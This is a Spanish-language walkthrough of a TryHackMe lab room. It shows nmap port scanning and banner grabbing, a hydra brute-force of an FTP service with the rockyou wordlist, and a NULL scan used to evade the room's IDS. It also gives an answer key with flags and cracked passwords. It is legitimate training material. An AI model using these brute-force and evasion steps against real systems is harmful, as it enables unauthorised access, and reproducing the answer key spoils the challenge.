# TryHackMe — Net Sec Challenge

**Sala:** Net Sec Challenge
**Plataforma:** TryHackMe (ruta *Jr Penetration Tester* / módulo *Network Security*)
**Dificultad:** Media (reto guiado)
**Tema:** Nmap (rangos de puertos, `-sV`, scan sigiloso `-sN`) · Banner grabbing con `telnet` · Fuerza bruta FTP con `hydra`
**Objetivo:** Responder 8 preguntas usando **solo nmap, telnet y hydra**.

> **Resumen en una línea:** un escaneo de todos los puertos saca 6 puertos (22, 80, 139, 445, 8080 y el **10021** no estándar); dos flags están **a la vista en los banners** (HTTP y SSH), otra vive en el FTP de `eddie`/`quinn` (hydra + rockyou) y la última aparece en el reto de `:8081` cuando el escaneo es **sigiloso** (el IDS del reto cuenta los paquetes).

---

## 0. Información de la máquina

- **IP:** la que muestre tu máquina (`MACHINE_IP`). En las capturas de otros writeups: `10.10.x.x`.
- **Puertos abiertos (6):** `22` SSH · `80` HTTP · `139/445` SMB · `8080/8081` reto web · `10021` FTP (no estándar).
- **Herramientas permitidas:** `nmap`, `telnet`, `hydra`.

---

## 1. Preguntas 1–3 — ¿qué puertos están abiertos?

El truco está en **escanear por rangos**: nmap solo mira los 1000 puertos más comunes por defecto, y aquí hay dos "escondidos".

**P1 — puerto abierto más alto por debajo de 10.000:**

```bash
nmap -p1-10000 MACHINE_IP -T4
```

**P2 — puerto abierto por encima de 10.100:**

```bash
nmap -p10001-65535 MACHINE_IP -v -T4
```

**P3 — ¿cuántos puertos TCP están abiertos?** (un solo escaneo lo resuelve todo):

```bash
nmap -p- -sV -sC MACHINE_IP
```

| Puerto | Servicio | Respuesta |
| --- | --- | --- |
| 22/tcp | ssh | — |
| 80/tcp | http | — |
| 139/tcp | netbios-ssn | — |
| 445/tcp | microsoft-ds | — |
| 8080/tcp | http (reto) | **P1 → `8080`** |
| 10021/tcp | ftp | **P2 → `10021`** |

**P3 → `6`** (22, 80, 139, 445, 8080 y 10021).

> Ver `Comando Rapido/Nmap.md` (rangos y `-p-`).

---

## 2. Preguntas 4–5 — flags y versiones en los banners

La versión/banner del servicio se lee directamente con `-sV` o con `telnet`:

**P4 — valor de la versión en el puerto 80:**

```bash
nmap -p80 -sV -sC MACHINE_IP
```

Copiar **tal cual** el valor de la columna `VERSION` (p. ej. `lighttpd 1.4.x`).

*También se puede ver con `telnet` (y así practicas el banner grabbing):*

```bash
telnet MACHINE_IP 80
GET / HTTP/1.1
Host: tryhackme.com
```

La cabecera `Server:` de la respuesta es la que interesa.

**P5 — flag en el banner de SSH:**

```bash
telnet MACHINE_IP 22
# o: nmap -p22 -sV MACHINE_IP
```

Al conectar, SSH saluda con su banner y la flag va pegada:

```
SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
```

**P5 → `THM{946219583339}`**

> Ojo: muchas veces **nmap ya muestra las dos flags** en la salida del escaneo inicial (columna `VERSION` / `fingerprint-strings`) — leer la salida completa ahorra pasos.

---

## 3. Pregunta 6 — versión del FTP en puerto no estándar

El FTP no está en el 21 sino en el **10021** (por eso solo aparece con el escaneo de rangos altos):

```bash
nmap -p10021 -sV MACHINE_IP
```

**P6 → `vsftpd 3.0.5`**

---

## 4. Pregunta 7 — fuerza bruta FTP con los usuarios dados

La sala indica que la ingeniería social dejó dos usuarios: **eddie** y **quinn**.

```bash
cat > users.txt << EOF
eddie
quinn
EOF

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 10021 MACHINE_IP ftp
```

- `-L` → lista de usuarios (uno por línea).
- `-s 10021` → puerto del FTP (fundamental, si no hydra prueba el 21).

Hydra devuelve las dos contraseñas (en writeups públicos: `eddie → jordan` y `quinn → andrea`). Entramos y bajamos el fichero con la flag:

```bash
ftp MACHINE_IP 10021
# login con eddie/quinn y su contraseña
ls
get ftp_flag.txt
bye
cat ftp_flag.txt
```

Solo **uno** de los dos usuarios tiene el fichero (`ftp_flag.txt`, 18 bytes).

**P7 → `THM{321452667098}`**

> Ver `Comando Rapido/Fuerza bruta y crackeo.md` y `Comando Rapido/Comandos básicos.md` (FTP).

---

## 5. Pregunta 8 — el reto web y el IDS

Visitando `http://MACHINE_IP:8081` hay un pequeño reto que dice, en esencia: *"no me cuentes que has escaneado la máquina de forma ruidosa"* — un **IDS interno cuenta los paquetes** y mientras marque >0% de detección no da la flag.

La solución es un **NULL scan** (no pone ningún flag TCP → casi nada que detectar), lento:

```bash
nmap -Pn -T3 -sN MACHINE_IP
# o con todos los puertos:
sudo nmap -Pn -T3 -sN -p- MACHINE_IP
```

Tras el escaneo sigiloso, recargar la página y aparece la flag.

**P8 → `THM{f7443f99}`** *(valor de writeups públicos; si tu instancia lo cambia, el que salga al recargar)*

> Si la web sigue al 100% de detección, baja más la velocidad (`-T2`) o espera unos segundos y vuelve a lanzar el `-sN`. Escaneos agresivos anteriores (`-T5`, SYN a todo pulmón) son justo lo que sube ese contador.

---

## 6. Resumen de respuestas

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 1 | Puerto abierto más alto < 10.000 | `8080` |
| 2 | Puerto abierto > 10.100 | `10021` |
| 3 | ¿Cuántos puertos TCP abiertos? | `6` |
| 4 | Versión del servicio en el puerto 80 | *valor de la columna VERSION de tu `nmap -p80 -sV`* |
| 5 | Flag en el banner de SSH | `THM{946219583339}` |
| 6 | Versión del FTP no estándar | `vsftpd 3.0.5` |
| 7 | Flag en los ficheros FTP de eddie/quinn | `THM{321452667098}` |
| 8 | Flag del reto web (:8081) | `THM{f7443f99}` |

---

## 7. Lecciones

1. **`nmap` por defecto solo mira 1000 puertos**: siempre hay que hacer `-p-` (o rangos) cuando la sala insinúa puertos no estándar.
2. **Los banners filtran flags**: SSH, HTTP y FTP se anuncian antes de autenticar nada — `-sV` o `telnet` y leer.
3. **`hydra -s <puerto>`** es obligatorio cuando el servicio no estándar (FTP en 10021).
4. **Los IDS del CTF se pueden evadir** con scans que no llevan flags (`-sN`, FIN, Xmas) y bajando la velocidad (`-T2/-T3`).
5. Una sola línea cubre la mitad de la sala: `nmap -p- -sV -sC MACHINE_IP`.

> Comandos relacionados: `Comando Rapido/Nmap.md`, `Comando Rapido/Fuerza bruta y crackeo.md`, `Comando Rapido/Comandos básicos.md`.
